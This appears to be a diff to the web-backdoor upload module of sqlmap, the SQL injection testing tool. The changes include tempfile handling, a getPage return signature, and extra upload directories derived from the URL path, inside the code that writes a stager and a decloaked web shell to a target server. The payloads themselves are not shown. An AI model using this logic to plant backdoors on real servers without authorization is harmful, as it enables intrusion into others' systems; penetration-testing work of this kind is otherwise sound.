@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2015 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
 See the file 'doc/COPYING' for copying permission
 """
 
@@ -9,9 +9,8 @@ import os
 import posixpath
 import re
 import StringIO
+import tempfile
 import urlparse
-
-from tempfile import mkstemp
 
 from extra.cloak.cloak import decloak
 from lib.core.agent import agent
@@ -117,7 +116,7 @@ class Web:
                 multipartParams['__EVENTVALIDATION'] = kb.data.__EVENTVALIDATION
                 multipartParams['__VIEWSTATE'] = kb.data.__VIEWSTATE
 
-            page = Request.getPage(url=self.webStagerUrl, multipart=multipartParams, raise404=False)
+            page, _, _ = Request.getPage(url=self.webStagerUrl, multipart=multipartParams, raise404=False)
 
             if "File uploaded" not in page:
                 warnMsg = "unable to upload the file through the web file "
@@ -201,6 +200,15 @@ class Web:
         directories.extend(getAutoDirectories())
         directories = list(oset(directories))
 
+        path = urlparse.urlparse(conf.url).path or '/'
+        if path != '/':
+            _ = []
+            for directory in directories:
+                _.append(directory)
+                if not directory.endswith(path):
+                    _.append("%s/%s" % (directory.rstrip('/'), path.strip('/')))
+            directories = _
+
         backdoorName = "tmpb%s.%s" % (randomStr(lowercase=True), self.webApi)
         backdoorContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoor.%s_" % self.webApi))
 
@@ -218,8 +226,6 @@ class Web:
 
             if not isWindowsDriveLetterPath(directory) and not directory.startswith('/'):
                 directory = "/%s" % directory
-            else:
-                directory = directory[2:] if isWindowsDriveLetterPath(directory) else directory
 
             if not directory.endswith('/'):
                 directory += '/'
@@ -257,10 +263,10 @@ class Web:
                     stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webApi)
                     self.webStagerFilePath = posixpath.join(ntToPosixSlashes(directory), stagerName)
 
-                    handle, filename = mkstemp()
-                    os.fdopen(handle).close()  # close low level handle (causing problems later)
+                    handle, filename = tempfile.mkstemp()
+                    os.close(handle)
 
-                    with open(filename, "w+") as f:
+                    with open(filename, "w+b") as f:
                         _ = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stager.%s_" % self.webApi))
                         _ = _.replace("WRITABLE_DIR", utf8encode(directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory))
                         f.write(_)
